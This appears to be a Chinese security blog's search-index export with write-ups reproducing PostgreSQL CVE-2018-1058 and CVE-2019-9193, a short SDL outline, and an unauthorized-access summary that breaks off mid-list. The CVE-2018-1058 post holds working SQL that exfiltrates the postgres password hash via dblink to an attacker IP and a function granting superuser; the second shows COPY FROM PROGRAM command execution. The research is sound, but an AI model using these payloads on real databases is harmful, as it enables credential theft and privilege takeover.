<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Postgresql CVE-2018-1058 漏洞分析与利用</title>
    <url>/zh-CN/cve-2018-1058.html</url>
    <content><![CDATA[<p>基于该文《<a href="https://xz.aliyun.com/t/2109" target="_blank" rel="noopener">PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】</a> 》，对 Postgresql CVE-2018-1058 漏洞进行研究。</p>
<p>在此，感谢大佬chybeta的分享。</p>
<h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><ul>
<li><p>CVE：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1058" target="_blank" rel="noopener">CVE-2018-1058</a></p>
</li>
<li><p>Postgresql</p>
<ul>
<li><p><a href="https://www.postgresql.org/about/news/1834/" target="_blank" rel="noopener">官方说法</a>：CVE-2018-1058: 在pg_dump与其他客户端应用里不可控的 search path。（渣翻）</p>
<blockquote>
<p>CVE-2018-1058: Uncontrolled search path element in pg_dump and other client applications</p>
<p>Please visit <a href="https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058%3A_Protect_Your_Search_Path" target="_blank" rel="noopener">A Guide to CVE-2018-1058: Protect Your Search Path</a> for a full explanation of the CVE-2018-1058.</p>
</blockquote>
</li>
<li><p><a href="https://github.com/postgres/postgres/commit/5770172cb0c9df9e6ce27c507b449557e5b45124" target="_blank" rel="noopener">修复记录</a>：修复方法，一大堆客户端将忽略数据库<code>search_path</code>和<code>schema privileges</code>，但是不包括<code>psql</code>and <code>pgbench</code>。</p>
<blockquote>
<p>As special exceptions, the following client applications behave as documented regardless of search_path settings and schema privileges: clusterdb createdb createlang createuser dropdb droplang dropuser ecpg (not programs it generates) initdb oid2name pg_archivecleanup pg_basebackup pg_config pg_controldata pg_ctl pg_dump pg_dumpall pg_isready pg_receivewal pg_recvlogical pg_resetwal pg_restore pg_rewind pg_standby pg_test_fsync pg_test_timing pg_upgrade pg_waldump reindexdb vacuumdb vacuumlo.  Not included are core client programs that run user-specified SQL commands, namely psql and pgbench.  PostgreSQL encourages non-core client applications to do likewise.</p>
</blockquote>
</li>
<li><p>修复的版本：10.3, 9.6.8, 9.5.12, 9.4.17, 9.3.22。</p>
</li>
</ul>
</li>
<li><p>总结：有问题的是客户端，属于设计缺陷。</p>
</li>
</ul>
<a id="more"></a>

<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><ol>
<li>小实验<ul>
<li>新建<code>public.test</code>表，插入内容<code>just test01</code>；</li>
<li>新建<code>schema</code>，名为<code>test</code>；</li>
<li>新建<code>test.test</code>表，插入内容<code>just test02</code></li>
</ul>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">evil=&gt; create table public.test as select 'just test01'::text as test;</span><br><span class="line">SELECT 1</span><br><span class="line">evil=&gt; select * from test;</span><br><span class="line">    test     </span><br><span class="line">-------------</span><br><span class="line"> just test01</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">evil=&gt; create schema test;</span><br><span class="line">CREATE SCHEMA</span><br><span class="line">evil=&gt; create table test.test as select 'just test02'::text as test;</span><br><span class="line">SELECT 1</span><br><span class="line">evil=&gt; select * from test;</span><br><span class="line">    test     </span><br><span class="line">-------------</span><br><span class="line"> just test02</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>小实验里为什么两次<code>select</code>的结果不一样？</p>
<ul>
<li><p>7.3 版本开始增加了<a href="https://www.postgresql.org/docs/current/static/ddl-schemas.html" target="_blank" rel="noopener">schemas</a>，用户可以在独立的命名空间创建数据表、函数等。默认的命名空间叫<code>public</code>。我的理解，就是一个大的数据库还可以分成几个小的数据库。比如有一个网站A和B共用一个数据库，A的用户表<code>A.user</code>，B的用户表<code>B.user</code>。</p>
</li>
<li><p>在没有注明<code>schema</code>的情况下，数据库会根据配置 <code>search_path</code>，来选择<code>schema</code>。</p>
</li>
<li><p>默认<code>search_path</code>的配置，<code>$user</code>排在<code>public</code> 前。<code>$user</code>的值可以通过<code>SELECT SESSION_USER;</code>得到。</p>
<blockquote>
<p> The default value for <code>search_path</code> is <code>$user,public</code> where <code>$user</code> refers to the name of the user connected (which can be determined by executing <code>SELECT SESSION_USER;</code>).</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">evil=&gt; SHOW search_path;</span><br><span class="line">   search_path   </span><br><span class="line">-----------------</span><br><span class="line"> "$user", public</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过<code>current_schema();</code>可以查询到当前数据库默认的<code>schema</code>。<code>test</code>用户登录时，在没有名为<code>test</code>的<code>schema</code>，默认的<code>schema</code>为<code>public</code>。当新建了名为<code>test</code>的<code>schema</code>，默认的<code>schema</code>为<code>test</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">evil=&gt; SELECT current_schema();</span><br><span class="line"> current_schema </span><br><span class="line">----------------</span><br><span class="line"> public</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">evil=&gt; create schema test;</span><br><span class="line">CREATE SCHEMA</span><br><span class="line">evil=&gt; SELECT current_schema();</span><br><span class="line"> current_schema </span><br><span class="line">----------------</span><br><span class="line"> test</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure>
</li>
<li><p>因此就可以解释为什么两次<code>select</code>的结果不一样。</p>
<ul>
<li>第一次<code>select * from test;</code>，数据库默认的<code>schema</code>是<code>public</code>，实际上执行的是<code>select * from public.test;</code></li>
<li>第二次<code>select * from test;</code>，数据库默认的<code>schema</code>是<code>test</code>，实际上执行的是<code>select * from public.test;</code></li>
</ul>
</li>
</ul>
</li>
<li><p>总结</p>
<p>根据<code>search_path</code>，创建排在前面的<code>schema</code>，就可以在使用默认<code>schema</code>的情况下，改变所使用的<code>schema</code>。<strong>那会有什么样的危害？</strong></p>
</li>
</ol>
<h2 id="0x03-攻击利用复现一"><a href="#0x03-攻击利用复现一" class="headerlink" title="0x03 攻击利用复现一"></a>0x03 攻击利用复现一</h2><p>操作系统：CentOS 7.6</p>
<p>PostgreSQL ：9.6.7</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ol>
<li><p>用管理员<code>postgres</code>登录数据库；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# &#x2F;usr&#x2F;local&#x2F;pgsql&#x2F;bin&#x2F;psql -U postgres</span><br><span class="line">psql (9.6.7)</span><br><span class="line">Type &quot;help&quot; for help.</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建普通用户<code>test</code>、创建数据库<code>evil</code>、将<code>evil</code>数据库的权限赋予<code>test</code>用户；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=# create user test password 'test';</span><br><span class="line">CREATE ROLE</span><br><span class="line">postgres=# create database evil;</span><br><span class="line">CREATE DATABASE</span><br><span class="line">postgres=# grant all privileges on database evil to test;</span><br><span class="line">GRANT</span><br></pre></td></tr></table></figure>
</li>
<li><p>连接<code>evil</code>数据库，开启<code>dblink</code>扩展。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=# \c evil</span><br><span class="line">You are now connected to database "evil" as user "postgres".</span><br><span class="line">evil=# CREATE EXTENSION dblink;</span><br><span class="line">CREATE EXTENSION</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ol>
<li><p>用普通用户<code>test</code>登录数据库<code>evil</code>；</p>
</li>
<li><p>定义恶意函数<code>array_to_string</code>，该函数会连接攻击机器<code>192.168.187.197</code>的<code>12345</code>端口；</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">evil=&gt; CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$ select dblink_connect((select <span class="string">'hostaddr=192.168.187.197 port=12345 user=postgres password=123456 sslmode=disable dbname='</span>||(SELECT passwd FROM pg_shadow WHERE usename=<span class="string">'postgres'</span>))); SELECT pg_catalog.array_to_string(<span class="variable">$1</span>,<span class="variable">$2</span>);</span><br><span class="line">evil$&gt; $$ LANGUAGE SQL VOLATILE;</span><br><span class="line">CREATE FUNCTION</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击机器<code>192.168.187.197</code>监听<code>12345</code>端口；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fen@kaliForFun:~$ nc -lvv 12345</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行<code>pg_dump</code>备份数据库<code>evil</code>；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-bash-4.2$ /usr/local/pgsql/bin/pg_dump -U postgres -f /tmp/evil.bak evil</span><br><span class="line">pg_dump: [archiver (db)] query failed: ERROR:  could not establish connection</span><br><span class="line">DETAIL:  expected authentication request from server, but received </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CONTEXT:  SQL function "array_to_string" statement 1</span><br><span class="line">pg_dump: [archiver (db)] query was: SELECT proretset, prosrc, probin, pg_catalog.pg_get_function_arguments(oid) AS funcargs, pg_catalog.pg_get_function_identity_arguments(oid) AS funciargs, pg_catalog.pg_get_function_result(oid) AS funcresult, array_to_string(protrftypes, ' ') AS protrftypes, proiswindow, provolatile, proisstrict, prosecdef, proleakproof, proconfig, procost, prorows, proparallel, (SELECT lanname FROM pg_catalog.pg_language WHERE oid = prolang) AS lanname FROM pg_catalog.pg_proc WHERE oid = '16529'::pg_catalog.oid</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击机器接收到数据库机器的连接，得到管理员账号<code>postgres</code>的密码（MD5密文）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fen@kaliForFun:~$ nc -lvv 12345</span><br><span class="line">Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::12345</span><br><span class="line">Ncat: Listening on 0.0.0.0:12345</span><br><span class="line">Ncat: Connection from 192.168.187.196.</span><br><span class="line">Ncat: Connection from 192.168.187.196:44728.</span><br><span class="line">Duserpostgresdatabasemd5c21719611bbb98ee1b7901e74a92f024</span><br><span class="line">NCAT DEBUG: Closing fd 5.</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
<li><p>对比，漏洞版本和无漏洞版本的日志</p>
<ul>
<li><p>9.6.7 版本的日志（有漏洞）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">LOG:  statement: SELECT pg_catalog.pg_is_in_recovery()</span><br><span class="line">...</span><br><span class="line">LOG:  statement: SET search_path = public, pg_catalog</span><br><span class="line">LOG:  statement: SELECT a.attname, pg_catalog.format_type(a.atttypid, a.atttypmod) AS atttypdefn, a.attlen, a.attalign, a.attisdropped, CASE WHEN a.attcollation &lt;&gt; at.typcollation THEN a.attcollation ELSE 0 END AS attcollation FROM pg_catalog.pg_type ct JOIN pg_catalog.pg_attribute a ON a.attrelid = ct.typrelid LEFT JOIN pg_catalog.pg_type at ON at.oid = a.atttypid WHERE ct.oid = '16512'::pg_catalog.oid ORDER BY a.attnum </span><br><span class="line">LOG:  statement: SET search_path = public, pg_catalog</span><br><span class="line">LOG:  statement: SELECT proretset, prosrc, probin, pg_catalog.pg_get_function_arguments(oid) AS funcargs, pg_catalog.pg_get_function_identity_arguments(oid) AS funciargs, pg_catalog.pg_get_function_result(oid) AS funcresult, array_to_string(protrftypes, ' ') AS protrftypes, proiswindow, provolatile, proisstrict, prosecdef, proleakproof, proconfig, procost, prorows, proparallel, (SELECT lanname FROM pg_catalog.pg_language WHERE oid = prolang) AS lanname FROM pg_catalog.pg_proc WHERE oid = '16529'::pg_catalog.oid</span><br><span class="line">ERROR:  could not establish connection</span><br><span class="line">DETAIL:  expected authentication request from server, but received </span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">CONTEXT:  SQL function "array_to_string" statement 1</span><br><span class="line">STATEMENT:  SELECT proretset, prosrc, probin, pg_catalog.pg_get_function_arguments(oid) AS funcargs, pg_catalog.pg_get_function_identity_arguments(oid) AS funciargs, pg_catalog.pg_get_function_result(oid) AS funcresult, array_to_string(protrftypes, ' ') AS protrftypes, proiswindow, provolatile, proisstrict, prosecdef, proleakproof, proconfig, procost, prorows, proparallel, (SELECT lanname FROM pg_catalog.pg_language WHERE oid = prolang) AS lanname FROM pg_catalog.pg_proc WHERE oid = '16529'::pg_catalog.oid</span><br><span class="line">LOG:  received fast shutdown request</span><br><span class="line">LOG:  aborting any active transactions</span><br><span class="line">LOG:  autovacuum launcher shutting down</span><br><span class="line">LOG:  shutting down</span><br><span class="line">LOG:  database system is shut down</span><br></pre></td></tr></table></figure>
</li>
<li><p>11.7 版本的日志（无漏洞）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOG:  statement: SELECT pg_catalog.pg_is_in_recovery()</span><br><span class="line">LOG:  statement: SELECT pg_catalog.set_config(&#39;search_path&#39;, &#39;&#39;, false)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>发现差异， 9.6.7 版本设置了<code>search_path</code>的顺序为<code>public, pg_catalog</code>，而11.7 版本设置<code>search_path</code>为空。</p>
</li>
<li><p>查了官方文档发现，当<code>pg_catalog</code>不在<code>search_path</code>的情况下，会先去搜索<code>pg_catalog</code>来确保找到内建的函数等。如果用户想要使用自己定义的函数来替代内建的情况下，需要将<code>pg_catalog</code>放在<code>search_path</code>的末尾。</p>
</li>
</ul>
<blockquote>
<p><a href="https://www.postgresql.org/docs/12/ddl-schemas.html#DDL-SCHEMAS-PATH" target="_blank" rel="noopener">The System Catalog Schema</a></p>
<p>If it is not named explicitly in the path then it is implicitly searched <em>before</em> searching the path’s schemas. This ensures that built-in names will always be findable. However, you can explicitly place <code>pg_catalog</code> at the end of your search path if you prefer to have user-defined names override built-in names.</p>
</blockquote>
<ul>
<li>因此，在 9.6.7 版本，<code>array_to_string</code>没有注明<code>schema</code>，<code>search_path</code>的顺序为<code>public, pg_catalog</code>，就会优先查找<code>public</code>，于是就执行了我们定义的恶意函数。而 11.7 版本，将<code>search_path</code>设置为空，<code>array_to_string</code>没有注明<code>schema</code>，则会优先查找<code>pg_catalog</code>，就执行不了恶意函数。</li>
</ul>
<h2 id="0x04-攻击利用复现二"><a href="#0x04-攻击利用复现二" class="headerlink" title="0x04 攻击利用复现二"></a>0x04 攻击利用复现二</h2><p>操作系统：CentOS 7.6</p>
<p>PostgreSQL ：9.6.17 （是的，我是用的 9.6 的最新版测的。）<code>PostgreSQL 9.6.17 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit</code></p>
<p><strong>注：同样的测试，在11.7 版本也试了，结果一样。<code>PostgreSQL 11.7 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit</code></strong></p>
<h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><ol>
<li>用管理员<code>postgres</code>登录数据库；</li>
<li>创建普通用户<code>test01</code>、创建数据库<code>evil01</code>、将<code>evil01</code>数据库的权限赋予<code>test01</code>用户；</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# psql96 -U postgres</span><br><span class="line">Password for user postgres: </span><br><span class="line">psql96 (9.6.17)</span><br><span class="line">Type "help" for help.</span><br><span class="line"></span><br><span class="line">postgres=# create user test01 password 'test01';</span><br><span class="line">CREATE ROLE</span><br><span class="line">postgres=# create database evil01;</span><br><span class="line">CREATE DATABASE</span><br><span class="line">postgres=# grant all privileges on database evil01 to test01;</span><br><span class="line">GRANT</span><br><span class="line">postgres=# \q</span><br></pre></td></tr></table></figure>

<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ol>
<li>用普通用户<code>test01</code>登录数据库<code>evil01</code>；</li>
<li>定义恶意函数 <code>public.upper(varchar)</code>；</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# psql96 -U test01 -d evil01</span><br><span class="line">Password for user test01: </span><br><span class="line">psql96 (9.6.17)</span><br><span class="line">Type "help" for help.</span><br><span class="line"></span><br><span class="line">evil01=&gt; CREATE FUNCTION public.upper(varchar) RETURNS TEXT AS $$</span><br><span class="line"><span class="meta">evil01$</span><span class="bash">&gt;     ALTER ROLE test01 SUPERUSER;</span></span><br><span class="line"><span class="meta">evil01$</span><span class="bash">&gt;     SELECT pg_catalog.upper(<span class="variable">$1</span>);</span></span><br><span class="line"><span class="meta">evil01$</span><span class="bash">&gt; $$ LANGUAGE SQL VOLATILE;</span></span><br><span class="line">CREATE FUNCTION</span><br><span class="line">evil01=&gt; CREATE TABLE public.test01 AS SELECT 'test01test01test01'::varchar AS contents;</span><br><span class="line">SELECT 1</span><br><span class="line">evil01=&gt; \q</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>管理员用户<code>postgres</code>登录，执行恶意函数<code>upper</code>，执行之后，普通用户<code>test01</code>的权限已提升为超级管理员权限。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# psql96 -U postgres</span><br><span class="line">Password for user postgres: </span><br><span class="line">psql96 (9.6.17)</span><br><span class="line">Type "help" for help.</span><br><span class="line"></span><br><span class="line">postgres=# select rolname,rolsuper from pg_roles;</span><br><span class="line">      rolname      | rolsuper </span><br><span class="line">-------------------+----------</span><br><span class="line"> pg_signal_backend | f</span><br><span class="line"> postgres          | t</span><br><span class="line"> test01            | f</span><br><span class="line">(3 rows)</span><br><span class="line"></span><br><span class="line">postgres=# \c evil01</span><br><span class="line">You are now connected to database "evil01" as user "postgres".</span><br><span class="line"></span><br><span class="line">evil01=# select contents from test01;</span><br><span class="line">      contents      </span><br><span class="line">--------------------</span><br><span class="line"> test01test01test01</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">evil01=# select upper(contents) from test01;</span><br><span class="line">       upper        </span><br><span class="line">--------------------</span><br><span class="line"> TEST01TEST01TEST01</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">evil01=# select rolname,rolsuper from pg_roles;</span><br><span class="line">      rolname      | rolsuper </span><br><span class="line">-------------------+----------</span><br><span class="line"> pg_signal_backend | f</span><br><span class="line"> postgres          | t</span><br><span class="line"> test01            | t</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure>

<h2 id="0x05-Q-amp-A"><a href="#0x05-Q-amp-A" class="headerlink" title="0x05 Q&amp;A"></a>0x05 Q&amp;A</h2><ol>
<li><p>如何安装dblink扩展？<a href="https://www.cnblogs.com/kuang17/p/10833458.html" target="_blank" rel="noopener">参考</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 通过 yum 安装对应版本的 contrib</span></span><br><span class="line">yum install postgresql11-contrib</span><br><span class="line"><span class="meta">#</span><span class="bash"> 源码编译安装</span></span><br><span class="line">[root@localhost ~]# cd /opt/postgresql-9.6.7/contrib/dblink</span><br><span class="line">[root@localhost dblink]# make &amp;&amp; make install</span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接需要使用dblink的数据库，开启dblink支持</span></span><br><span class="line">postgres=# CREATE EXTENSION dblink;</span><br><span class="line">CREATE EXTENSION</span><br></pre></td></tr></table></figure>
</li>
<li><p>如何源码安装9.6.7版本的Postgresql? </p>
<blockquote>
<p>9.6版本官方指导：<a href="https://www.postgresql.org/docs/9.6/install-short.html" target="_blank" rel="noopener">https://www.postgresql.org/docs/9.6/install-short.html</a></p>
</blockquote>
<p> 安装依赖：<code>yum install -y readline、readline-devel、zlib-devel</code></p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>Postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title>Postgresql CVE-2019-9193 是安全漏洞吗？</title>
    <url>/zh-CN/cve-2019-9193.html</url>
    <content><![CDATA[<p>今天在搜索 Postgresql 漏洞的时候，看到好几篇都说<code>CVE-2019-9193</code>任意代码执行、命令执行，还有漏洞复现文章。</p>
<p>然而看到一篇文章标题《PostgreSQL否认CVE-2019-9193为安全漏洞》？？？</p>
<p>查了一下CNVD的这个<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-08279" target="_blank" rel="noopener">漏洞</a>的信息，危险级别高，结果参考链接打不开？？？</p>
<h2 id="那到底-CVE-2019-9193-是个什么情况？"><a href="#那到底-CVE-2019-9193-是个什么情况？" class="headerlink" title="那到底 CVE-2019-9193 是个什么情况？"></a>那到底 CVE-2019-9193 是个什么情况？</h2><h3 id="Postgresql原文"><a href="#Postgresql原文" class="headerlink" title="Postgresql原文"></a>Postgresql原文</h3><blockquote>
<p><a href="https://www.postgresql.org/about/news/1935/" target="_blank" rel="noopener">https://www.postgresql.org/about/news/1935/</a></p>
</blockquote>
<p>大概意思就是超级用户和pg_execute_server_program，本来就可以执行命令。</p>
<p>原来CVE里说的 <code>pg_read_server_files</code> and <code>pg_write_server_files</code> 是没有权限执行<code>COPY..PROGRAM</code>。</p>
<p>最后让大家永远不要将超级用户访问权限授予远程或不信任的用户。</p>
<p>注：<code>pg_read_server_files</code> and <code>pg_write_server_files</code>，是<a href="https://www.postgresql.org/docs/11/default-roles.html" target="_blank" rel="noopener">11版本新增的默认角色</a>。</p>
<h3 id="漏洞复现的步骤"><a href="#漏洞复现的步骤" class="headerlink" title="漏洞复现的步骤"></a>漏洞复现的步骤</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#39;id&#39;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>

<p><strong>实际起作用的命令是<code>COPY</code></strong></p>
<h3 id="COPY命令的文档"><a href="#COPY命令的文档" class="headerlink" title="COPY命令的文档"></a><code>COPY</code>命令的<a href="https://www.postgresql.org/docs/11/sql-copy.html" target="_blank" rel="noopener">文档</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPY table_name [ ( column_name [, ...] ) ]</span><br><span class="line">    FROM &#123; &#39;filename&#39; | PROGRAM &#39;command&#39; | STDIN &#125;</span><br><span class="line">    [ [ WITH ] ( option [, ...] ) ]</span><br><span class="line"></span><br><span class="line">COPY &#123; table_name [ ( column_name [, ...] ) ] | ( query ) &#125;</span><br><span class="line">    TO &#123; &#39;filename&#39; | PROGRAM &#39;command&#39; | STDOUT &#125;</span><br><span class="line">    [ [ WITH ] ( option [, ...] ) ]</span><br></pre></td></tr></table></figure>



<p><code>COPY</code> naming a file or command is only allowed to database superusers or users who are granted one of the default roles <code>pg_read_server_files</code>, <code>pg_write_server_files</code>, or <code>pg_execute_server_program</code>, since it allows reading or writing any file or running a program that the server has privileges to access.</p>
<p>大概意思就是：</p>
<ul>
<li>超级用户可以在服务器上读写文件及执行命令，</li>
<li><code>pg_read_server_files</code>可以读服务器的文件。</li>
<li><code>pg_write_server_files</code>可以向服务器写文件。</li>
<li><code>pg_execute_server_program</code>可以在服务器上执行命令。</li>
</ul>
<h3 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h3><p><code>pg_read_server_files</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=&gt; copy cmd_exec from program 'id';</span><br><span class="line">ERROR:  must be superuser or a member of the pg_execute_server_program role to COPY to or from an external program</span><br><span class="line">HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec from '/root/hacker';</span><br><span class="line">ERROR:  could not open file "/root/hacker" for reading: Permission denied</span><br><span class="line">HINT:  COPY FROM instructs the PostgreSQL server process to read a file. You may want a client-side facility such as psql's \copy.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec from '/tmp/hacker';</span><br><span class="line">COPY 2</span><br></pre></td></tr></table></figure>

<p><code>pg_write_server_files</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=&gt; copy cmd_exec from program 'id';</span><br><span class="line">ERROR:  must be superuser or a member of the pg_execute_server_program role to COPY to or from an external program</span><br><span class="line">HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec to '/tmp/hacker';</span><br><span class="line">COPY 2</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec to '/root/hacker';</span><br><span class="line">ERROR:  could not open file "/root/hacker" for writing: Permission denied</span><br><span class="line">HINT:  COPY TO instructs the PostgreSQL server process to write a file. You may want a client-side facility such as psql's \copy.</span><br></pre></td></tr></table></figure>

<p><code>pg_execute_server_program</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=&gt; copy cmd_exec from program 'id';</span><br><span class="line">COPY 1</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec to '/tmp/hacker';</span><br><span class="line">ERROR:  must be superuser or a member of the pg_write_server_files role to COPY to a file</span><br><span class="line">HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec from '/tmp/hacker';</span><br><span class="line">ERROR:  must be superuser or a member of the pg_read_server_files role to COPY from a file</span><br><span class="line">HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec from program 'cat /tmp/hacker';</span><br><span class="line">COPY 4</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec to program 'tee /tmp/hacker';</span><br><span class="line">COPY 8</span><br></pre></td></tr></table></figure>



<ul>
<li><p><code>pg_execute_server_program</code>可以执行命令，但是不能直接读写文件。不过既然能执行命令，就可以间接实现读写文件。</p>
</li>
<li><p><code>pg_write_server_files</code>只可以写文件。</p>
</li>
<li><p><code>pg_read_server_files</code>只可以读文件。</p>
</li>
<li><p>不管是哪一种操作，在服务器上是postgres用户的权限。（以postgres用户运行的程序）</p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>不是狭义上的漏洞。</li>
<li>权限设置有问题的话，的确可以执行代码、读写文件，渗透可用。</li>
<li>服务器上的敏感文件不要随便开放给其他用户读写，遵循最小化权限原则。</li>
</ul>
]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>Postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title>安全开发生命周期（SDL:Security Development Lifecycle)</title>
    <url>/zh-CN/security-development-lifecycle.html</url>
    <content><![CDATA[<ol>
<li>培训<ul>
<li>项目所有相关人员都需要进行安全培训。要让每一个人都对安全有所了解。</li>
<li>更重要是项目相关人员与安全人员能达到共识，好开展后续的工作。</li>
</ul>
</li>
<li>要求（项目经理或产品经理）<ul>
<li>确定安全的要求，也就是确定目标。有目标才好开展工作。</li>
<li>从来没有万无一失的安全，要设计通过的最低标准。</li>
<li>分析哪些部分更重要，更需要关注。</li>
</ul>
</li>
<li>设计（项目经理或产品经理）<ul>
<li>确定好安全需求</li>
<li>减小暴露，越暴露越危险。</li>
<li>攻击可能会来自哪里</li>
</ul>
</li>
<li>实施（编程人员）<ul>
<li>使用安全的函数和方法</li>
<li>使用安全的开发工具</li>
<li>静态分析</li>
</ul>
</li>
<li>验证 （测试人员）<ul>
<li>动态分析：侧重功能、逻辑</li>
<li>模糊测试：侧重异常</li>
</ul>
</li>
<li>发布（项目经理或产品经理）<ul>
<li>做好记录，达到了哪些安全目标，哪些部分还存在风险但影响不大等。</li>
</ul>
</li>
<li>响应<ul>
<li>弄清楚出现漏洞发现问题，能找谁解决。</li>
</ul>
</li>
</ol>
<p><strong>安全从来就不是找茬。预防胜于治疗。</strong></p>
<blockquote>
<p><a href="https://www.cnblogs.com/xiaozi/p/9959726.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/9959726.html</a><br><a href="https://www.microsoft.com/en-us/securityengineering/sdl/" target="_blank" rel="noopener">https://www.microsoft.com/en-us/securityengineering/sdl/</a><br><a href="https://wiki.owasp.org/index.php/OWASP_Secure_Software_Development_Lifecycle_Project" target="_blank" rel="noopener">https://wiki.owasp.org/index.php/OWASP_Secure_Software_Development_Lifecycle_Project</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>未授权漏洞</title>
    <url>/zh-CN/summary-unauthorized-access-vulnerability.html</url>
    <content><![CDATA[<p>漏洞场景</p>
<ul>
<li>Web服务类：页面、API<ul>
<li>Docker（Restful 的 API）、Elasticsearch（API）、CouchDB（Restful 的 API）</li>
</ul>
</li>
<li>非Web服务类：数据库、缓存、远程控制等<ul>
<li>Redis、Memcached、VNC、Rsync</li>
</ul>
</li>
</ul>
<p>检测方法</p>
<ul>
<li>内部检查<ul>
<li>检查配置文件</li>
<li>检查启动命令</li>
</ul>
</li>
<li>外围扫描<ul>
<li>Web服务类：直接访问，根据返回的信息判断</li>
<li>非Web服务类：利用客户端进行连接，根据连接是否成功及敏感命令是否执行成功，判断漏洞是否存在</li>
</ul>
</li>
</ul>
<p>漏洞利用</p>
<ul>
<li>写入Webshell：服务器开放Web服务、并且具有Web目录的写权限</li>
<li>利用Crontab定时任务反弹shell：具有写入定时任务文件的权限</li>
